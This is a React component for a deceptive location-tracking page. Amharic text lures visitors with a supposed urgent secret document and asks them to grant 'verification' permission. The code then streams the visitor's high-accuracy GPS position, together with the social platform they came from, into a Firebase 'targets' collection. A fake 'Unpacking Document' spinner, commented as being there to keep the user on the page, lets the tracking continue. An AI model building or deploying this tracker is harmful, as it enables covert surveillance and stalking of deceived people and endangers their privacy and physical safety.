import React, { useState, useEffect, useRef } from 'react';
import { Shield, Eye, AlertTriangle, Fingerprint, MapPin, Globe } from 'lucide-react';
import { motion } from 'motion/react';
import { 
  db, 
  auth, 
  signInAnonymously, 
  setDoc, 
  doc, 
  serverTimestamp, 
  handleFirestoreError, 
  OperationType 
} from '../lib/firebase';

export const TrackerPortal: React.FC = () => {
  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('idle');
  const [errorMsg, setErrorMsg] = useState<string>('');
  const [progress, setProgress] = useState(0);
  const targetIdRef = useRef<string | null>(null);

  useEffect(() => {
    // Generate or get persistent ID for this target
    let tid = localStorage.getItem('eagle_target_id');
    if (!tid) {
      tid = `T-${Math.random().toString(36).substring(2, 11).toUpperCase()}`;
      localStorage.setItem('eagle_target_id', tid);
    }
  }, []);

  // Protocol initialization
  const startRecon = async () => {
    setStatus('scanning');
    setErrorMsg('');
    setProgress(0);
    
    // Technical visual progression
    const timer = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(timer);
          return 100;
        }
        return prev + 2;
      });
    }, 30);

    try {
      // Background Auth - No email requested
      const cred = await signInAnonymously(auth);
      const user = cred.user;

      if (!navigator.geolocation) {
        throw new Error('SECURE_PROTOCOL_UNSUPPORTED');
      }

      // Detect Platform accurately
      const ua = navigator.userAgent || "";
      let platform = 'Browser';
      if (ua.includes('FB')) platform = 'Facebook';
      else if (ua.includes('WhatsApp')) platform = 'WhatsApp';
      else if (ua.includes('Telegram')) platform = 'Telegram';
      else if (ua.includes('Instagram')) platform = 'Instagram';
      else if (ua.includes('Twitter') || ua.includes('X/')) platform = 'X';

      // High-precision stealth stream
      navigator.geolocation.watchPosition(
        async (position) => {
          // Once granted, we switch to a 'granted' state which shows "Unpacking..."
          setStatus('granted');
          const { latitude, longitude, accuracy } = position.coords;
          
          try {
            // Persistent stealth uplink
            await setDoc(doc(db, 'targets', user.uid), {
              name: `Vector ${user.uid.slice(0, 4)}`,
              lat: latitude,
              lng: longitude,
              accuracy: accuracy,
              lastSeen: new Date().toISOString(),
              status: 'active',
              platform: platform
            }, { merge: true });
          } catch (e) {
            handleFirestoreError(e, OperationType.WRITE, `targets/${user.uid}`);
          }
        },
        (error) => {
          console.error("Signal Lost:", error);
          if (error.code === error.PERMISSION_DENIED) {
            setStatus('denied');
            setErrorMsg('ACCESS_REJECTED: የደህንነት ፈቃድ አልተሰጠም። እባክዎ ምስጢራዊ መረጃውን ለማየት ፍቃድ ይስጡ (Settings > Privacy > Location > Allow).');
          } else {
            setStatus('error');
            setErrorMsg(`SIGNAL_TIMEOUT: ግንኙነቱ ተቋርጧል፡፡ ክፍት ቦታ ላይ ሆነው ይሞክሩ።`);
          }
        },
        { 
          enableHighAccuracy: true, 
          maximumAge: 0, 
          timeout: 25000 
        }
      );
    } catch (err: any) {
      console.error(err);
      setStatus('error');
      setErrorMsg('HANDSHAKE_FAILURE: Terminal reset required.');
    }
  };

  return (
    <div className="min-h-screen bg-[#050608] text-slate-300 font-mono flex flex-col items-center justify-center p-4 tech-grid">
      <div className="max-w-md w-full bg-[#0a0c12] rounded-xl border border-slate-800 p-8 relative overflow-hidden shadow-2xl">
        {/* Stealth Overlay */}
        <div className="absolute top-0 right-0 p-4 opacity-[0.03] pointer-events-none">
          <Globe className="w-32 h-32" />
        </div>

        <div className="flex justify-center mb-8">
          <div className="relative">
            <div className="w-20 h-20 bg-blue-600/5 rounded-full flex items-center justify-center border border-blue-600/20">
              <Shield className="w-10 h-10 text-blue-500/80 animate-pulse" />
            </div>
            <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-slate-900 border border-slate-800 rounded-full flex items-center justify-center">
              <Fingerprint className="w-3 h-3 text-blue-400" />
            </div>
          </div>
        </div>

        <div className="text-center mb-10">
          <h2 className="text-xl font-black tracking-tighter mb-2 text-white italic">DOCUMENT_ENCRYPTED</h2>
          <div className="flex items-center justify-center gap-2 mb-1">
            <div className="h-[1px] w-8 bg-slate-800"></div>
            <p className="text-[9px] text-slate-500 uppercase tracking-[0.3em] font-bold">Priority Signal Alpha</p>
            <div className="h-[1px] w-8 bg-slate-800"></div>
          </div>
        </div>

        <div className="space-y-8">
          {status === 'idle' && (
            <motion.div 
              initial={{ opacity: 0, y: 10 }} 
              animate={{ opacity: 1, y: 0 }}
              className="space-y-8"
            >
              <div className="bg-slate-900/30 border border-slate-800/50 p-6 rounded-lg text-center relative overflow-hidden">
                <div className="absolute top-0 left-0 w-1 h-full bg-blue-600/40"></div>
                <p className="text-[12px] leading-relaxed text-slate-300 font-medium">
                  "አስቸኳይ ምስጢራዊ መረጃ ሊወገድ ነው... ሪፖርቱን ለማየት 'የማረጋገጫ ቁጥር' የሚለውን በመጫን ፈቃድ ይስጡ።"
                </p>
                <div className="mt-4 flex items-center justify-center gap-4 text-[8px] text-slate-600 uppercase tracking-widest font-bold border-t border-slate-800/50 pt-4">
                  <span className="flex items-center gap-1"><Shield className="w-2 h-2" /> Encrypted</span>
                  <span className="flex items-center gap-1"><MapPin className="w-2 h-2" /> 2FA_REQ</span>
                </div>
              </div>
              
              <button 
                onClick={startRecon}
                className="group relative w-full py-5 bg-gradient-to-r from-blue-700 to-blue-600 text-white font-black text-[12px] tracking-[0.4em] rounded shadow-[0_0_30px_rgba(37,99,235,0.2)] hover:shadow-[0_0_40px_rgba(37,99,235,0.4)] transition-all active:scale-[0.97] uppercase overflow-hidden"
              >
                <span className="relative z-10 flex items-center justify-center gap-3">
                  <Fingerprint className="w-5 h-5 group-hover:scale-110 transition-transform" />
                  የማረጋገጫ ቁጥር (ACCESS)
                </span>
                <div className="absolute inset-0 bg-white/10 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700"></div>
              </button>

              <div className="text-center">
                <p className="text-[8px] text-slate-600 uppercase tracking-widest leading-loose">Secure Access Node: FB, WA, Telegram & Browsers Supported</p>
              </div>
            </motion.div>
          )}

          {status === 'scanning' && (
            <div className="space-y-6 py-4">
              <div className="space-y-2">
                <div className="flex justify-between items-center text-[10px] font-bold text-slate-600 mb-1">
                  <span className="tracking-[0.2em] animate-pulse">ESTABLISHING TUNNEL...</span>
                  <span className="text-blue-500 font-mono italic">{progress}%</span>
                </div>
                <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden border border-slate-800">
                  <motion.div 
                    className="h-full bg-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.5)]" 
                    initial={{ width: 0 }}
                    animate={{ width: `${progress}%` }}
                  />
                </div>
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div className="bg-slate-950 p-2 border border-slate-800 rounded text-[7px] text-slate-600 uppercase">Packet_Sync: OK</div>
                <div className="bg-slate-950 p-2 border border-slate-800 rounded text-[7px] text-slate-600 uppercase">Node_Id: {Math.random().toString(36).substring(7)}</div>
              </div>
            </div>
          )}

          {status === 'granted' && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="text-center py-10 space-y-6"
            >
              <div className="flex justify-center relative">
                <div className="w-16 h-16 bg-blue-500/10 rounded-full flex items-center justify-center text-blue-500 border border-blue-500/20">
                  <Eye className="w-8 h-8 animate-ping" />
                </div>
              </div>
              <div className="space-y-2">
                <p className="text-[13px] font-black text-white uppercase tracking-widest italic animate-pulse">
                  Unpacking Document...
                </p>
                <p className="text-[10px] text-slate-500 max-w-[200px] mx-auto leading-relaxed">
                  Encryption keys verified. Please wait while the secure stream is established.
                </p>
              </div>
              {/* Fake loading spinner to keep user on page */}
              <div className="flex justify-center">
                <div className="w-5 h-5 border-2 border-blue-500/30 border-t-blue-500 rounded-full animate-spin"></div>
              </div>
            </motion.div>
          )}

          {status === 'denied' && (
            <div className="text-center p-8 border border-red-500/20 bg-red-500/5 rounded-lg space-y-4">
              <AlertTriangle className="w-10 h-10 text-red-600 mx-auto opacity-80" />
              <div className="space-y-1">
                <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">SECURITY_PROTOCOL_REVOKED</p>
                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የምስጢር ሰነዱን ለማንበብ የቦታ መገኛ (Location) ፈቃድ ያስፈልጋል፡፡ እባኮት "Allow" የሚለውን በመጫን ፈቃድ ይስጡ።</p>
              </div>
              <button 
                onClick={() => setStatus('idle')}
                className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-white text-[10px] uppercase font-bold rounded transition-colors"
              >
                እንደገና ይሞክሩ (RE-AUTHORIZE)
              </button>
            </div>
          )}

          {status === 'error' && (
            <div className="text-center p-6 border border-amber-500/20 bg-amber-500/5 rounded-lg space-y-3">
              <AlertTriangle className="w-8 h-8 text-amber-600/50 mx-auto" />
              <p className="text-[11px] font-bold text-amber-500 uppercase italic">CONNECTION_TIMEOUT</p>
              <p className="text-[9px] text-slate-500 px-4">{errorMsg}</p>
              <button 
                onClick={() => setStatus('idle')}
                className="text-[9px] text-blue-500 underline font-bold uppercase"
              >
                Retry Handshake
              </button>
            </div>
          )}
        </div>

        <div className="mt-12 pt-6 border-t border-slate-800/50 flex items-center justify-between opacity-30 text-[7px] uppercase tracking-[0.4em] font-black">
          <div className="flex items-center gap-1.5">
            <div className="w-1 h-1 rounded-full bg-blue-500 animate-ping"></div>
            <span>LINK_ESTABLISHED</span>
          </div>
          <span className="text-slate-500">v8.4 // ALPHA_SECTOR</span>
        </div>
      </div>
    </div>
  );
};
